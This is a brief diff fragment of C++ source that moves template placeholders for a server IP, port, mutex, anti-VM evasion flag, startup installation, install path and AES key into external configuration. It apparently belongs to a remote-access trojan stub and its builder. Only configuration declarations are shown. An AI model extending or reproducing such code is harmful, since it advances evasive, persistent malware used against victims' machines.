@@ -60,14 +60,17 @@
 using namespace Gdiplus;
 using namespace std;
 
-#define SERVER_IP "{{HOST}}"
-#define SERVER_PORT {{PORT}}
-#define MUTEX_NAME "{{MUTEX}}"
-#define ENABLE_ANTI_VM {{ANTI_VM}}
-#define ENABLE_INSTALLATION {{STARTUP}}
-#define TARGET_FILE_NAME "{{FILE_NAME}}"
-#define INSTALL_ENV "{{INSTALL_ENV}}"
-#define AES_KEY "{{AES_KEY}}"
+// --- Config (Extern from config.o) ---
+extern "C" {
+    extern char SERVER_IP[64];
+    extern int SERVER_PORT;
+    extern char MUTEX_NAME[64];
+    extern char TARGET_FILE_NAME[64];
+    extern char INSTALL_ENV[32];
+    extern char AES_KEY[64];
+    extern int ENABLE_ANTI_VM;
+    extern int ENABLE_INSTALLATION;
+}
 
 #define BUF_SIZE 4096
 
